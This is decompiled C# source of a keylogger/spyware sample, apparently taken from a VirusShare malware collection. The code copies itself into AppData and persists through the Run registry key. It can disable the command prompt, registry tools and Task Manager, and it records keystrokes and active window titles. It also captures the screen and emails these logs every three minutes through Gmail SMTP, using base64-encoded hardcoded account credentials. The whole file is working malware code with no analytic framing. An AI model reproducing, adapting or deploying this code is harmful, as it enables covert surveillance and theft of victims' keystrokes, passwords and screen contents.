// Decompiled with JetBrains decompiler
// Type: dVuJCmUWqTYlwRe
// Assembly: Eh, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 33F4788D-E660-4D0C-8610-AC04D5C03D88
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00014-msil\Trojan-Ransom.Win32.Blocker.jfxk-8f320aa54fc4be71f5dbac2a44ebabef637a59e0ac61ef5eb3cb3e37ec401996.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class dVuJCmUWqTYlwRe
{
  private static string SEfCBcKbNRrSdXp = "eW91cm1vdGhlcmludGhlYnVtQGdtYWlsLmNvbQ==";
  private static string mJfEvrDUjFsCZUx = "cG9vZnVjazg=";
  private static string zgzGODirsqvTZgL = "smtp.gmail.com";
  private static int mlCFIzYngQyBVxC = 587;
  private static string VuJCmUWqTYlwReS;
  private static string EfCBcKbNRrSdXpm;
  private static string JfEvrDUjFsCZUxz;
  private static string gzGODirsqvTZgLY;
  private static string XnrtlLaSDkmHjoD;
  private static string wmSbcafQJQuIHXa;
  private static int vHBTDZJUaWhyNVW = 180000;
  private static string cyMaIZLPodaUmjG = (string) null;
  private static object QNvJiiKSeHaGevW = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string gEycdKQjrhNIJHM = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage wELbDCSIKCbEigP = new MailMessage();
  private static SmtpClient UzjfUoeVjtccPCc = new SmtpClient();
  [AccessedThroughProperty("lVRGaRIVfPOCnPl")]
  private static yMaIZLPodaUmjGc _lVRGaRIVfPOCnPl;
  private static object oBETopyJEhwPjDw;
  private static RichTextBox rUzjfUoeVjtccPC;

  static dVuJCmUWqTYlwRe()
  {
    dVuJCmUWqTYlwRe.lVRGaRIVfPOCnPl = new yMaIZLPodaUmjGc();
    dVuJCmUWqTYlwRe.oBETopyJEhwPjDw = (object) Path.GetFileName(Application.ExecutablePath);
    dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC = new RichTextBox();
  }

  private static yMaIZLPodaUmjGc lVRGaRIVfPOCnPl
  {
    get => dVuJCmUWqTYlwRe._lVRGaRIVfPOCnPl;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (dVuJCmUWqTYlwRe._lVRGaRIVfPOCnPl != null)
        yMaIZLPodaUmjGc.KeyDown -= new yMaIZLPodaUmjGc.KeyDownEventHandler(dVuJCmUWqTYlwRe.orjIXQzhkFhlzKf);
      dVuJCmUWqTYlwRe._lVRGaRIVfPOCnPl = value;
      if (dVuJCmUWqTYlwRe._lVRGaRIVfPOCnPl == null)
        return;
      yMaIZLPodaUmjGc.KeyDown += new yMaIZLPodaUmjGc.KeyDownEventHandler(dVuJCmUWqTYlwRe.orjIXQzhkFhlzKf);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int gyLyvpIFcMWcYkB(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    dVuJCmUWqTYlwRe.wmSbcafQJQuIHXa = Conversions.ToString(true);
    dVuJCmUWqTYlwRe.JfEvrDUjFsCZUxz = Conversions.ToString(false);
    dVuJCmUWqTYlwRe.gzGODirsqvTZgLY = Conversions.ToString(false);
    dVuJCmUWqTYlwRe.XnrtlLaSDkmHjoD = Conversions.ToString(false);
    dVuJCmUWqTYlwRe.EfCBcKbNRrSdXpm = Conversions.ToString(false);
    dVuJCmUWqTYlwRe.VuJCmUWqTYlwReS = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\qxOonEtwoNqVTBp.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(dVuJCmUWqTYlwRe.gEycdKQjrhNIJHM + "\\qxOonEtwoNqVTBp.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), dVuJCmUWqTYlwRe.oBETopyJEhwPjDw))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), dVuJCmUWqTYlwRe.oBETopyJEhwPjDw)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), dVuJCmUWqTYlwRe.oBETopyJEhwPjDw)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), dVuJCmUWqTYlwRe.oBETopyJEhwPjDw)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), dVuJCmUWqTYlwRe.oBETopyJEhwPjDw)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(dVuJCmUWqTYlwRe.VuJCmUWqTYlwReS) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(dVuJCmUWqTYlwRe.oBETopyJEhwPjDw))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(dVuJCmUWqTYlwRe.oBETopyJEhwPjDw), Operators.ConcatenateObject(Operators.ConcatenateObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), dVuJCmUWqTYlwRe.oBETopyJEhwPjDw));
    if (Conversions.ToBoolean(dVuJCmUWqTYlwRe.EfCBcKbNRrSdXpm))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\qxOonEtwoNqVTBp.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(dVuJCmUWqTYlwRe.JfEvrDUjFsCZUxz))
      Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(dVuJCmUWqTYlwRe.gzGODirsqvTZgLY))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(dVuJCmUWqTYlwRe.XnrtlLaSDkmHjoD))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 180000;
    timer1.Tick += new EventHandler(dVuJCmUWqTYlwRe.xMtLwBbPNHZWsOm_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(dVuJCmUWqTYlwRe.soBETopyJEhwPjD_Ticked);
    timer2.Start();
    dVuJCmUWqTYlwRe.lVRGaRIVfPOCnPl.BHDOSgCENWRuLdx();
    Application.Run();
  }

  private static string CXZiGnRgNTmukQL()
  {
    string lpString = new string(char.MinValue, 100);
    dVuJCmUWqTYlwRe.gyLyvpIFcMWcYkB(dVuJCmUWqTYlwRe.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string sfStQOqYpbfFfqk(string ZmlCFIzYngQyBVx) => Encoding.ASCII.GetString(Convert.FromBase64String(ZmlCFIzYngQyBVx));

  public static void xMtLwBbPNHZWsOm_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(dVuJCmUWqTYlwRe.wmSbcafQJQuIHXa))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = dVuJCmUWqTYlwRe.xRLBgppnseXeJVV(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dVuJCmUWqTYlwRe.QNvJiiKSeHaGevW, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.SEfCBcKbNRrSdXp));
        message.To.Add(dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.SEfCBcKbNRrSdXp));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.SEfCBcKbNRrSdXp), dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.mJfEvrDUjFsCZUx))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage wElbDcsikCbEigP = dVuJCmUWqTYlwRe.wELbDCSIKCbEigP;
      wElbDcsikCbEigP.From = new MailAddress(dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.SEfCBcKbNRrSdXp));
      wElbDcsikCbEigP.To.Add(dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.SEfCBcKbNRrSdXp));
      wElbDcsikCbEigP.Subject = "COOLogger Logs from - " + Environment.UserName;
      wElbDcsikCbEigP.Body = dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC.Text;
      SmtpClient uzjfUoeVjtccPcc = dVuJCmUWqTYlwRe.UzjfUoeVjtccPCc;
      uzjfUoeVjtccPcc.Host = "smtp.gmail.com";
      uzjfUoeVjtccPcc.Port = 587;
      uzjfUoeVjtccPcc.EnableSsl = true;
      uzjfUoeVjtccPcc.Credentials = (ICredentialsByHost) new NetworkCredential(dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.SEfCBcKbNRrSdXp), dVuJCmUWqTYlwRe.sfStQOqYpbfFfqk(dVuJCmUWqTYlwRe.mJfEvrDUjFsCZUx));
      uzjfUoeVjtccPcc.Send(dVuJCmUWqTYlwRe.wELbDCSIKCbEigP);
      dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC.Text = "";
    }
  }

  public static void orjIXQzhkFhlzKf(Keys e) => dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC.Text += dVuJCmUWqTYlwRe.lVRGaRIVfPOCnPl.RLBgppnseXeJVVk(e);

  public static void soBETopyJEhwPjD_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(dVuJCmUWqTYlwRe.cyMaIZLPodaUmjG, dVuJCmUWqTYlwRe.CXZiGnRgNTmukQL(), false) == 0)
      return;
    dVuJCmUWqTYlwRe.cyMaIZLPodaUmjG = dVuJCmUWqTYlwRe.CXZiGnRgNTmukQL();
    if (Operators.CompareString(dVuJCmUWqTYlwRe.cyMaIZLPodaUmjG, "", false) == 0)
      return;
    RichTextBox rUzjfUoeVjtccPc = dVuJCmUWqTYlwRe.rUzjfUoeVjtccPC;
    rUzjfUoeVjtccPc.Text = rUzjfUoeVjtccPc.Text + "\r\n\r\n~~~~~" + dVuJCmUWqTYlwRe.cyMaIZLPodaUmjG + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string xRLBgppnseXeJVV(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
